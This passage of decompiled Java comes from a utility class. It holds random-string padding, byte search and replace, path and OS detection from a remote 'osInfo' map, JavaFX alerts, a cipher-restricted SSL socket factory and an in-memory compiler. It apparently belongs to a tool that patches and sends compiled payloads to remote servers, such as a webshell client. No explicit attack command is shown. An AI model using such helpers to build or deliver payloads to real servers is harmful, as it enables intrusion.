        while(var2.hasNext()) {
            String key = (String)var2.next();
            result.put(key, (String)obj.get(key));
        }

        return result;
    }

    public static Timestamp stringToTimestamp(String timeString) {
        Timestamp timestamp = null;

        try {
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss.SSS");
            Date parsedDate = dateFormat.parse(timeString);
            timestamp = new Timestamp(parsedDate.getTime());
        } catch (Exception var4) {
        }

        return timestamp;
    }

    public static String getRandomString(int length) {
        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();

        for(int i = 0; i < length; ++i) {
            int number = random.nextInt(62);
            sb.append(str.charAt(number));
        }

        return sb.toString();
    }

    public static String getRandomAlpha(int length) {
        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();

        for(int i = 0; i < length; ++i) {
            int number = random.nextInt(52);
            sb.append(str.charAt(number));
        }

        return sb.toString();
    }

    public static String getWhatever() {
        int randStringLength = (new SecureRandom()).nextInt(3000);
        String randString = getRandomString(randStringLength);
        return randString;
    }

    public static int matchData(byte[] srcData, byte[] dataToFind) {
        int iDataLen = srcData.length;
        int iDataToFindLen = dataToFind.length;
        boolean bGotData = false;
        int iMatchDataCntr = 0;

        for(int i = 0; i < iDataLen; ++i) {
            if (srcData[i] == dataToFind[iMatchDataCntr]) {
                ++iMatchDataCntr;
                bGotData = true;
            } else if (srcData[i] == dataToFind[0]) {
                iMatchDataCntr = 1;
            } else {
                iMatchDataCntr = 0;
                bGotData = false;
            }

            if (iMatchDataCntr == iDataToFindLen) {
                return i - dataToFind.length + 1;
            }
        }

        return -1;
    }

    public static String formatPath(String path) {
        if (path.indexOf("\\") > 0) {
            path = path.replaceAll("\\\\", "/");
        }

        if (path.endsWith(":")) {
            path = path + "/";
        }

        if (!path.endsWith("/")) {
            path = path + "/";
        }

        if (isWindowsPath(path)) {
            path = path.substring(0, 1).toUpperCase() + path.substring(1);
        }

        return path;
    }

    public static boolean isWindowsPath(String path) {
        return path.length() > 1 && path.substring(0, 2).matches("^[a-zA-Z]:");
    }

    public static String getRootPath(String path) {
        String rootPath = "/";
        if (isWindowsPath(path)) {
            rootPath = formatPath(path.substring(0, 2));
        }

        return rootPath;
    }

    public static String getContextPath(String url) {
        String result = "/";

        try {
            URI u = new URI(url);
            String path = u.normalize().getPath();
            if (path.startsWith("/")) {
                path = path.substring(1);
            }

            int pos = path.indexOf("/");
            if (pos > 0) {
                result = "/" + path.substring(0, pos + 1);
            }
        } catch (Exception var5) {
        }

        return result;
    }

    public static boolean isWindows(Map<String, String> basicInfoMap) {
        String osInfo = (String)basicInfoMap.get("osInfo");
        return osInfo.indexOf("windows") >= 0 || osInfo.indexOf("winnt") >= 0;
    }

    public static int getOSType(String osInfo) {
        int osType = -1;
        if (osInfo.indexOf("windows") < 0 && osInfo.indexOf("winnt") < 0) {
            if (osInfo.indexOf("linux") >= 0) {
                osType = Constants.OS_TYPE_LINUX;
            } else if (osInfo.indexOf("mac") >= 0) {
                osType = Constants.OS_TYPE_MAC;
            }
        } else {
            osType = Constants.OS_TYPE_WINDOWS;
        }

        return osType;
    }

    public static void showErrorMessage(String title, String msg) {
        Alert alert = new Alert(AlertType.ERROR);
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((event) -> {
            window.hide();
        });
        alert.setTitle(title);
        alert.setHeaderText("");
        alert.setContentText(msg);
        alert.show();
    }

    public static void showInfoMessage(String title, String msg) {
        Alert alert = new Alert(AlertType.INFORMATION);
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((event) -> {
            window.hide();
        });
        alert.setTitle(title);
        alert.setHeaderText("");
        alert.setContentText(msg);
        alert.show();
    }

    public static String getOrDefault(JSONObject obj, String key, Class type) {
        String result = "";
        if (obj.has(key)) {
            result = obj.get(key).toString();
        } else if (type == String.class) {
            result = "";
        } else if (type == Integer.TYPE) {
            result = "0";
        }

        return result;
    }

    public static String getBaseUrl(String urlStr) {
        String result = urlStr;

        try {
            URL url = new URL(urlStr);
            int port = url.getPort();
            if (port == -1) {
                result = url.getProtocol() + "://" + url.getHost();
            } else {
                result = url.getProtocol() + "://" + url.getHost() + ":" + url.getPort();
            }
        } catch (MalformedURLException var4) {
            var4.printStackTrace();
        }

        return result;
    }

    public static byte[] replaceBytes(byte[] src, byte[] find, byte[] replace) {
        String replaced = cutBrackets(Arrays.toString(src)).replace(cutBrackets(Arrays.toString(find)), cutBrackets(Arrays.toString(replace)));
        return (byte[])Arrays.stream(replaced.split(", ")).map(Byte::valueOf).collect(toByteArray());
    }

    private static String cutBrackets(String s) {
        return s.substring(1, s.length() - 1);
    }

    private static Collector<Byte, ?, byte[]> toByteArray() {
        return Collector.of(ByteArrayOutputStream::new, ByteArrayOutputStream::write, (baos1, baos2) -> {
            try {
                baos2.writeTo(baos1);
                return baos1;
            } catch (IOException var3) {
                throw new UncheckedIOException(var3);
            }
        }, ByteArrayOutputStream::toByteArray);
    }

    public static class MyJavaFileManager extends ForwardingJavaFileManager<JavaFileManager> {
        protected MyJavaFileManager(JavaFileManager fileManager) {
            super(fileManager);
        }

        public JavaFileObject getJavaFileForInput(Location location, String className, Kind kind) throws IOException {
            JavaFileObject javaFileObject = (JavaFileObject)Utils.fileObjects.get(className);
            if (javaFileObject == null) {
                super.getJavaFileForInput(location, className, kind);
            }

            return javaFileObject;
        }

        public JavaFileObject getJavaFileForOutput(Location location, String qualifiedClassName, Kind kind, FileObject sibling) throws IOException {
            JavaFileObject javaFileObject = new Utils.MyJavaFileObject(qualifiedClassName, kind);
            Utils.fileObjects.put(qualifiedClassName, javaFileObject);
            return javaFileObject;
        }
    }

    private static class MySSLSocketFactory extends SSLSocketFactory {
        private SSLSocketFactory sf;
        private String[] enabledCiphers;

        private MySSLSocketFactory(SSLSocketFactory sf, String[] enabledCiphers) {
            this.sf = null;
            this.enabledCiphers = null;
            this.sf = sf;
            this.enabledCiphers = enabledCiphers;
        }

        private Socket getSocketWithEnabledCiphers(Socket socket) {
            if (this.enabledCiphers != null && socket != null && socket instanceof SSLSocket) {
                ((SSLSocket)socket).setEnabledCipherSuites(this.enabledCiphers);
            }

            return socket;
        }

        public Socket createSocket(Socket s, String host, int port, boolean autoClose) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(s, host, port, autoClose));
        }

        public String[] getDefaultCipherSuites() {
            return this.sf.getDefaultCipherSuites();
        }

        public String[] getSupportedCipherSuites() {
            return this.enabledCiphers == null ? this.sf.getSupportedCipherSuites() : this.enabledCiphers;
        }

        public Socket createSocket(String host, int port) throws IOException, UnknownHostException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port));
        }

        public Socket createSocket(InetAddress address, int port) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port));
        }

        public Socket createSocket(String host, int port, InetAddress localAddress, int localPort) throws IOException, UnknownHostException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port, localAddress, localPort));
        }

        public Socket createSocket(InetAddress address, int port, InetAddress localaddress, int localport) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port, localaddress, localport));
        }
    }

    public static class MyJavaFileObject extends SimpleJavaFileObject {
        private String source;
        private ByteArrayOutputStream outPutStream;

        public MyJavaFileObject(String name, String source) {
            super(URI.create("String:///" + name + Kind.SOURCE.extension), Kind.SOURCE);
            this.source = source;
        }

        public MyJavaFileObject(String name, Kind kind) {
            super(URI.create("String:///" + name + kind.extension), kind);
            this.source = null;
        }

        public CharSequence getCharContent(boolean ignoreEncodingErrors) {
            if (this.source == null) {
                throw new IllegalArgumentException("source == null");
            } else {
                return this.source;
            }
        }

        public OutputStream openOutputStream() throws IOException {
            this.outPutStream = new ByteArrayOutputStream();
            return this.outPutStream;
        }

        public byte[] getCompiledBytes() {
            return this.outPutStream.toByteArray();
        }
    }
}
